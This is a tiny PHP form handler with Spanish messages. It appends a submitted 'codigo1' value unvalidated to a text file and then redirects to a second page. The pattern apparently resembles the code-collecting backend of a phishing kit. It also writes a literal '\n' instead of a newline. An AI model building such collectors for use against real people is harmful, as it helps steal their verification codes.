<?php

$ar=fopen("codigo1.txt","a") or die ("error al enviar");

$codigo1=$_REQUEST['codigo1'];


fwrite($ar,$codigo1);
fwrite($ar,'\n');

header("location:2index.html");


?>
